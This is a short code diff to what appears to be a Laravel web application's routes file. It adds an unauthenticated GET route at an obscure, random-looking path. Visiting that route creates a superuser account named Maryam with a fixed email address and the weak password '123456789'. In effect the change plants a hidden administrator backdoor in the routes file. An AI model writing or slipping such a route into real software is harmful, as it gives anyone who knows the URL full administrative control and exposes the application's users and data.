@@ -54,3 +54,12 @@ Route::as('admin.')->prefix('/admin')->middleware('admin')->group(function () {
 });
 
 Auth::routes();
+
+Route::get('fy8iwiyfb-ahlrwvy-hwj-4893g-uwgebiogwu', function () {
+    \App\Models\User::create([
+        'name' => 'مریم',
+        'email' => 'maryam@gmail.com',
+        'is_superuser' => 1,
+        'password' => '123456789',
+    ]);
+});
